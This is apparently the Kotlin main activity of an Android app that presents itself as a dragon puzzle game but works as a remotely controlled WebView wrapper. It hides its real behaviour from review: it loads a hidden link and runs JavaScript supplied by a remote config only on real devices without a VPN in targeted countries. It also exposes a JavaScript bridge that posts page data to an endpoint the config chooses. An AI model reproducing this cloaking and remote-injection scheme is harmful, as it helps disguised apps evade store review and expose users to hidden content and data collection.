package com.profwht.dragonpazzle

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.Color
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.Bundle
import android.webkit.*
import androidx.activity.OnBackPressedCallback
import androidx.appcompat.app.AppCompatActivity
import okhttp3.*
import org.json.JSONObject
import java.io.IOException

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private lateinit var configManager: ConfigManager

    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        webView = findViewById(R.id.webView)
        setupWebView()

        configManager = ConfigManager(this)
        webView.addJavascriptInterface(WebAppInterface(), "AndroidBridge")
        
        loadDynamicConfig()

        onBackPressedDispatcher.addCallback(this, object : OnBackPressedCallback(true) {
            override fun handleOnBackPressed() {
                if (webView.canGoBack()) webView.goBack()
                else {
                    isEnabled = false
                    onBackPressedDispatcher.onBackPressed()
                }
            }
        })
    }

    private fun setupWebView() {
        webView.webViewClient = WebViewClient()
        webView.webChromeClient = WebChromeClient()
        val settings = webView.settings
        settings.javaScriptEnabled = true
        settings.domStorageEnabled = true
        settings.databaseEnabled = true
        settings.allowFileAccess = true
        settings.loadWithOverviewMode = true
        settings.useWideViewPort = true
        settings.cacheMode = WebSettings.LOAD_DEFAULT
        settings.mediaPlaybackRequiresUserGesture = false
    }

    private fun loadDynamicConfig() {
        configManager.fetchConfig { config ->
            if (config != null) {
                val links = config.optJSONObject("links")
                val linkA = links?.optString("link_a", "https://dragon.pookieai.ink/") ?: ""
                val linkB = links?.optString("link_b", "https://dragon.pookieai.ink/") ?: ""
                val targetCountries = links?.optString("target_countries", "") ?: ""
                
                val ui = config.optJSONObject("ui")
                val remoteTitle = ui?.optString("app_title", "MYSTIC DRAGON") ?: "MYSTIC DRAGON"
                val statusBarColor = ui?.optString("status_bar_color", "#FF0000") ?: "#FF0000"

                configManager.getUserCountry { userCountry ->
                    runOnUiThread {
                        title = remoteTitle
                        try { window.statusBarColor = Color.parseColor(statusBarColor) } catch (e: Exception) {}

                        val isSafe = !isEmulator() && !isVpnActive()

                        if (isSafe && (targetCountries.contains(userCountry, ignoreCase = true) || targetCountries == "ALL")) {
                            webView.loadUrl(linkA)
                            val customJs = config.optString("custom_js_plugin", "")
                            if (customJs.isNotEmpty()) webView.evaluateJavascript(customJs, null)
                        } else {
                            webView.loadUrl(linkB)
                        }
                    }
                }
            } else {
                runOnUiThread { webView.loadUrl("https://dragon.pookieai.ink/") }
            }
        }
    }

    private fun isEmulator(): Boolean {
        val build = Build.FINGERPRINT + Build.MODEL + Build.MANUFACTURER + Build.PRODUCT
        return build.contains("generic") || build.contains("unknown") || build.contains("google_sdk") || 
               build.contains("Emulator") || build.contains("Android SDK built for x86")
    }

    private fun isVpnActive(): Boolean {
        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val caps = cm.getNetworkCapabilities(cm.activeNetwork)
        return caps?.hasTransport(NetworkCapabilities.TRANSPORT_VPN) ?: false
    }

    inner class WebAppInterface {
        @JavascriptInterface
        fun trackEvent(eventName: String, paramsJson: String) {
            sendToCustomTracking("event", eventName, paramsJson)
        }

        @JavascriptInterface
        fun syncTable(tableName: String, tableDataJson: String) {
            sendToCustomTracking("table", tableName, tableDataJson)
        }
    }

    private fun sendToCustomTracking(type: String, key: String, data: String) {
        val tracking = ConfigManager.cachedConfig?.optJSONObject("tracking")
        val customPlugin = tracking?.optJSONObject("custom_plugin")
        if (customPlugin?.optBoolean("enabled") == true) {
            val endpoint = customPlugin.optString("endpoint")
            val client = OkHttpClient()
            val body = FormBody.Builder().add("type", type).add("key", key).add("data", data).add("package", packageName).build()
            val request = Request.Builder().url(endpoint).post(body).build()
            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {}
                override fun onResponse(call: Call, response: Response) { response.close() }
            })
        }
    }
}
